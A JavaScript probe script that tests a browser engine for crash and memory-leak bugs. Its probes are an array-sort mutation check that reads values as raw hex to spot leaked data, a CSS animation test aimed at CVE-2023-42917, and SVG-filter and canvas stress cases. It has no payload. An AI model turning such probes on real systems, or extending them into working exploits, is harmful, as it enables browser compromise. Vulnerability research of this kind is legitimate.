// API probe - RISKY half: DOM mutation, CSS animation, sort confusion
// These are the likely crash candidates — run one at a time
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

// ─── Test 1: Array.sort mutation (VERY likely crasher) ───
test('sort_mutation', function() {
  var arr = [];
  for (var i = 0; i < 32; i++) arr.push(i + 0.5);

  var callCount = 0;
  var target = { secret: 42 };
  var leaked = [];

  arr.sort(function(a, b) {
    callCount++;
    if (callCount === 10) {
      arr[0] = target;
      arr[16] = target;
    }
    if (callCount > 10 && typeof a === 'number') {
      var hex = f64ToHex(a);
      if (hex !== '0x0000000000000000' && !hex.startsWith('0x40') && !hex.startsWith('0x3f')) {
        leaked.push({ call: callCount, hex: hex });
      }
    }
    return typeof a === 'number' && typeof b === 'number' ? a - b : 0;
  });

  var postSort = [];
  for (var i = 0; i < Math.min(5, arr.length); i++) {
    postSort.push({ i: i, type: typeof arr[i], val: typeof arr[i] === 'number' ? f64ToHex(arr[i]) : 'obj' });
  }

  return {
    result: leaked.length > 0 ? 'LEAK' : 'no_leak',
    calls: callCount,
    leaked: leaked.slice(0, 3),
    postSort: postSort
  };
});

// ─── Test 2: CSS animation (potential CVE-2023-42917) ───
test('css_anim', function() {
  var style = document.createElement('style');
  style.textContent = '@keyframes k1{0%{transform:scale(1)}100%{transform:scale(2)}} .a1{animation:k1 .001s linear infinite}';
  document.head.appendChild(style);

  var els = [];
  for (var i = 0; i < 20; i++) {
    var d = document.createElement('div');
    d.className = 'a1';
    d.style.cssText = 'width:10px;height:10px;position:absolute';
    document.body.appendChild(d);
    els.push(d);
  }

  document.body.offsetWidth; // force layout

  for (var i = 0; i < els.length; i++) els[i].remove();
  style.remove();

  return { result: 'survived', count: els.length };
});

// ─── Test 3: SVG filter chain ───
test('svg_filter', function() {
  var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  svg.setAttribute('width', '100');
  svg.setAttribute('height', '100');

  var filter = document.createElementNS('http://www.w3.org/2000/svg', 'filter');
  filter.id = 'f1';

  // Chain multiple filter primitives
  var blur = document.createElementNS('http://www.w3.org/2000/svg', 'feGaussianBlur');
  blur.setAttribute('stdDeviation', '3');
  blur.setAttribute('result', 'blur1');
  filter.appendChild(blur);

  var offset = document.createElementNS('http://www.w3.org/2000/svg', 'feOffset');
  offset.setAttribute('in', 'blur1');
  offset.setAttribute('dx', '5');
  offset.setAttribute('dy', '5');
  filter.appendChild(offset);

  svg.appendChild(filter);

  var rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
  rect.setAttribute('width', '50');
  rect.setAttribute('height', '50');
  rect.setAttribute('fill', 'red');
  rect.setAttribute('filter', 'url(#f1)');
  svg.appendChild(rect);

  document.body.appendChild(svg);
  svg.getBBox();
  svg.remove();

  return { result: 'survived' };
});

// ─── Test 4: Canvas putImageData negative offset ───
test('canvas_neg_offset', function() {
  var c = document.createElement('canvas');
  c.width = 4; c.height = 4;
  var ctx = c.getContext('2d');
  if (!ctx) return { result: 'no_ctx' };

  var id = ctx.getImageData(0, 0, 4, 4);
  new Uint8Array(id.data.buffer).fill(0xFF);
  ctx.putImageData(id, -2, -2);

  var id2 = ctx.getImageData(0, 0, 4, 4);
  return {
    result: 'canvas_ok',
    byte0: id2.data[0],
    byte12: id2.data[12]
  };
});

// ─── Test 5: Large canvas ───
test('canvas_large', function() {
  var c = document.createElement('canvas');
  try {
    c.width = 32768;
    c.height = 1;
    var ctx = c.getContext('2d');
    var ok = !!ctx;
    c.width = 1;
    return { result: ok ? 'ok' : 'no_ctx', width: 32768 };
  } catch(e) {
    return { result: 'err', msg: e.message.substring(0, 40) };
  }
});

return JSON.stringify(results);
})();
